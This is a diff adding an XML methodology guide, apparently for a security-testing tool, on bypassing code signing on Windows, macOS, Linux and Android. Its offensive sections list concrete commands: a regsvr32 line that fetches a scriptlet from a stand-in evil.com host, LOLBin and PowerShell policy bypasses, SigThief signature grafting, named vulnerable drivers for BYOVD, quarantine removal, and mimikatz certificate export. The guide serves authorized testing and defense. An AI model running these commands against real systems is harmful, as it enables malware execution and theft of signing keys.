@@ -1,0 +1,277 @@
+<vulnerability_guide>
+  <title>CODE SIGNING BYPASS</title>
+
+  <critical>Code signing establishes trust in software authenticity and integrity. Bypassing code signing allows malicious code to appear legitimate, evade security controls, and gain execution privileges. Weaknesses exist in certificate validation, timestamp handling, and signature verification implementations.</critical>
+
+  <scope>
+    - Certificate chain weaknesses
+    - Signature verification bypass
+    - Timestamp manipulation
+    - Dual-signature attacks
+    - Catalog signing abuse
+    - AppLocker/WDAC bypass
+  </scope>
+
+  <methodology>
+    1. SIGNATURE ENUMERATION
+       {% raw %}
+       # Windows - Check signature
+       sigcheck.exe -a target.exe
+       Get-AuthenticodeSignature target.exe
+
+       # List certificate chain
+       signtool verify /pa /v target.exe
+
+       # Check for catalog signing
+       sigcheck.exe -h target.exe
+
+       # macOS - Check signature
+       codesign -dv --verbose=4 target.app
+       spctl -a -v target.app
+
+       # Linux - Check GPG signature
+       gpg --verify package.sig package
+
+       # Android - APK signature
+       apksigner verify --verbose target.apk
+       jarsigner -verify -verbose target.apk
+       {% endraw %}
+
+    2. CERTIFICATE WEAKNESS ANALYSIS
+       {% raw %}
+       # Weak certificate issues:
+       # - MD5/SHA1 hash algorithms
+       # - Short RSA keys (<2048 bit)
+       # - Expired certificates
+       # - Revoked certificates not checked
+       # - Self-signed certificates accepted
+
+       # Check certificate details
+       openssl x509 -in cert.pem -text -noout
+
+       # Look for:
+       # - Signature Algorithm: sha1WithRSAEncryption (weak)
+       # - Public-Key: (1024 bit) (weak)
+       # - Validity: Not After (expired)
+
+       # Certificate chain validation bypass
+       # Missing intermediate certificates
+       # Incorrect chain order
+       # Expired root certificates
+       {% endraw %}
+
+    3. TIMESTAMP MANIPULATION
+       {% raw %}
+       # Timestamps extend signature validity
+
+       # Timestamp issues:
+       # - No timestamp = signature expires with cert
+       # - Weak timestamp hash algorithm
+       # - Timestamp not validated
+
+       # Check timestamp
+       sigcheck.exe -a target.exe | findstr /i timestamp
+
+       # Timestamping bypass:
+       # - Remove timestamp, use expired cert
+       # - RFC3161 vs Authenticode timestamp
+       # - Timestamp server availability
+
+       # Some applications don't verify timestamps
+       # Signature appears valid despite expired cert
+       {% endraw %}
+
+    4. UNSIGNED CODE EXECUTION
+       {% raw %}
+       # Find paths where unsigned code runs
+
+       # Windows paths often missed:
+       # - DLL search order hijacking
+       # - Side-loading through signed apps
+       # - LOLBins (Living Off the Land Binaries)
+
+       # Signed application abuse
+       # Load unsigned DLL through signed exe
+       # rundll32.exe malicious.dll,entry
+       # msiexec.exe /q /i malicious.msi
+
+       # Catalog signing gaps
+       # Not all Windows components catalog-signed
+       # New files not in catalog
+
+       # PowerShell bypass
+       Set-ExecutionPolicy Bypass
+       powershell -ep bypass -file script.ps1
+       {% endraw %}
+
+    5. APPLOCKER/WDAC BYPASS
+       {% raw %}
+       # Windows application whitelisting bypass
+
+       # AppLocker bypasses:
+       # - regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll
+       # - mshta vbscript:Execute("...")
+       # - installutil.exe /logfile= /LogToConsole=false /U malicious.dll
+       # - rundll32.exe javascript:"\..\mshtml,RunHTMLApplication"
+
+       # WDAC (Windows Defender Application Control) bypasses:
+       # - Signed vulnerable drivers (BYOVD)
+       # - Misconfigurations in policy
+       # - Managed installer abuse
+
+       # Check current policy
+       Get-AppLockerPolicy -Effective | Select -ExpandProperty RuleCollections
+       {% endraw %}
+  </methodology>
+
+  <advanced_techniques>
+    <dual_signature_attack>
+      {% raw %}
+      # Windows supports dual signatures (SHA1 + SHA256)
+
+      # Attack: Add malicious signature alongside legitimate
+      # Some validators only check one signature
+
+      # Create dual-signed binary
+      signtool sign /fd sha1 /t http://timestamp.url target.exe
+      signtool sign /fd sha256 /tr http://timestamp.url /td sha256 /as target.exe
+
+      # Manipulation:
+      # - First signature legitimate
+      # - Second signature malicious but not checked
+
+      # Some AV only validates primary signature
+      {% endraw %}
+    </dual_signature_attack>
+
+    <signature_embedding>
+      {% raw %}
+      # Embed valid signature from trusted binary
+
+      # SigThief - steal signatures
+      python sigthief.py -i signed.exe -t malicious.exe -o output.exe
+
+      # Signature doesn't validate but:
+      # - Some tools only check presence
+      # - Metadata shows as "signed"
+      # - May bypass basic filters
+
+      # Catalog abuse:
+      # Add malicious file hash to valid catalog
+      # If catalog signature valid, file appears signed
+      {% endraw %}
+    </signature_embedding>
+
+    <driver_signature_bypass>
+      {% raw %}
+      # Driver signing is stricter but bypassable
+
+      # BYOVD (Bring Your Own Vulnerable Driver)
+      # Use legitimately signed vulnerable driver
+      # Exploit driver to load unsigned code
+
+      # Known vulnerable signed drivers:
+      # - capcom.sys
+      # - RTCore64.sys
+      # - dbutil_2_3.sys (Dell)
+
+      # Test mode bypass
+      bcdedit /set testsigning on
+      # Allows unsigned drivers (requires reboot + secure boot off)
+
+      # Leaked certificates
+      # Use leaked/stolen signing certificates
+      {% endraw %}
+    </driver_signature_bypass>
+
+    <macos_gatekeeper_bypass>
+      {% raw %}
+      # macOS Gatekeeper bypass techniques
+
+      # Quarantine attribute removal
+      xattr -d com.apple.quarantine malicious.app
+
+      # Mount point bypass
+      # Mount disk image, execute from there
+      # Some versions don't check mounted volumes
+
+      # App bundle manipulation
+      # Modify signed app contents
+      # Some files not covered by signature
+
+      # Notarization bypass
+      # Sideload without notarization check
+      # Use deprecated APIs
+      {% endraw %}
+    </macos_gatekeeper_bypass>
+
+    <android_signature_bypass>
+      {% raw %}
+      # Android APK signature bypass
+
+      # V1 (JAR) signature issues:
+      # - Extra files in APK ignored
+      # - Path traversal in ZIP entries
+
+      # V2/V3 signature strengths but:
+      # - Downgrade to V1 if accepted
+      # - Signature stripping attacks
+
+      # Platform key abuse
+      # System apps signed with platform key
+      # If key leaked, full system access
+
+      # Check signature scheme
+      apksigner verify -v --print-certs target.apk
+      {% endraw %}
+    </android_signature_bypass>
+
+    <certificate_theft>
+      {% raw %}
+      # Steal legitimate signing certificates
+
+      # Sources:
+      # - Compromised developer workstations
+      # - Build server HSM access
+      # - Leaked in source control
+      # - Purchased on dark markets
+
+      # Certificate locations (Windows):
+      # - Certificate stores
+      # - .pfx files
+      # - HSM/smart cards
+
+      # Extract certificate
+      mimikatz # crypto::capi
+      mimikatz # crypto::certificates /export
+      {% endraw %}
+    </certificate_theft>
+  </advanced_techniques>
+
+  <detection>
+    - Monitor for signature validation failures
+    - Alert on execution of unsigned code
+    - Track certificate changes and expirations
+    - Audit AppLocker/WDAC policy changes
+    - Check for known LOLBin abuse
+  </detection>
+
+  <validation>
+    - Identify signature validation weaknesses
+    - Demonstrate bypass of signing requirement
+    - Execute unsigned code in protected environment
+    - Test AppLocker/WDAC bypass techniques
+    - Document certificate chain issues
+  </validation>
+
+  <pro_tips>
+    - sigcheck -a shows detailed signature information on Windows
+    - Many applications check signature presence but not validity
+    - Timestamped signatures remain valid after cert expiration
+    - LOLBins are signed by Microsoft and often allowed
+    - Driver signing is kernel-level but BYOVD defeats it
+    - macOS quarantine flag is the first thing to check
+  </pro_tips>
+
+  <remember>Code signing is only as strong as its verification. Many systems check that a signature exists without validating it properly. Even strong signing can be bypassed through signed-but-vulnerable binaries, stolen certificates, or simply finding execution paths that skip verification entirely. Always test the actual enforcement, not just the policy.</remember>
+</vulnerability_guide>
